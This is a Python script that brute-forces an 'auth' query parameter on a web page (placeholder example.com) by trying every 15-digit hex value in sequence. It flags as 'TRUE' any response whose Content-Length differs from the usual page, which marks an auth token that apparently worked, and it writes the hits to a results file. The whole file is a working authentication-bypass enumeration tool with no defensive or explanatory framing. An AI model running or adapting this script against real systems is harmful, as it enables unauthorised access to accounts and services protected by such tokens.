import requests
import time
from datetime import datetime

# =========================
# Configuration
# =========================
BASE_URL = "https://example.com/index.php"
EXCLUDED_CONTENT_LENGTH = 5465

START_HEX = "000000000000000"
END_HEX   = "fffffffffffffff"

TIMEOUT = 10
SLEEP_BETWEEN_REQUESTS = 0.05

OUTPUT_TRUE  = "results_TRUE.txt"
OUTPUT_FALSE = "results_FALSE.txt"
ERROR_LOG    = "errors.log"

# =========================
# SESSION
# =========================
session = requests.Session()
session.headers.update({
    "User-Agent": "HEX-Auth-Scanner/1.3",
    "Accept": "*/*",
    "Connection": "close"
})

# =========================
# Helper
# =========================
def log_error(msg):
    with open(ERROR_LOG, "a") as f:
        f.write(msg + "\n")

def check_auth(hex_value, true_file, false_file):
    url = f"{BASE_URL}?auth={hex_value}"

    try:
        r = session.get(
            url,
            timeout=TIMEOUT,
            allow_redirects=True,
            verify=True
        )

        # === Nur Status 200 ist relevant ===
        if r.status_code != 200:
            return

        cl = r.headers.get("Content-Length")
        timestamp = datetime.utcnow().isoformat()

        # === TRUE: Status 200 UND Content-Length != 5465 ===
        if cl is None or int(cl) != EXCLUDED_CONTENT_LENGTH:
            line = (
                f"{timestamp} TRUE "
                f"auth={hex_value} "
                f"status=200 "
                f"content-length={cl}"
            )
            print("[TRUE]", hex_value)
            true_file.write(line + "\n")
            true_file.flush()

        # === FALSE: Status 200 UND Content-Length == 5465 ===
        else:
            line = (
                f"{timestamp} FALSE "
                f"auth={hex_value} "
                f"status=200 "
                f"content-length={cl}"
            )
            false_file.write(line + "\n")
            false_file.flush()

    except requests.RequestException as e:
        log_error(f"{hex_value} ERROR {str(e)}")

# =========================
# MAIN
# =========================
def main():
    start = int(START_HEX, 16)
    end   = int(END_HEX, 16)

    print("[*] HTTPS Scan start")
    print("[*] TRUE  => Status 200 & Content-Length != 5465")
    print("[*] FALSE => Status 200 & Content-Length == 5465")
    print("[*] Range:", START_HEX, "→", END_HEX)

    with open(OUTPUT_TRUE, "a") as true_file, open(OUTPUT_FALSE, "a") as false_file:
        for i in range(start, end + 1):
            hex_value = f"{i:015x}"
            check_auth(hex_value, true_file, false_file)

            if SLEEP_BETWEEN_REQUESTS > 0:
                time.sleep(SLEEP_BETWEEN_REQUESTS)

if __name__ == "__main__":
    main()
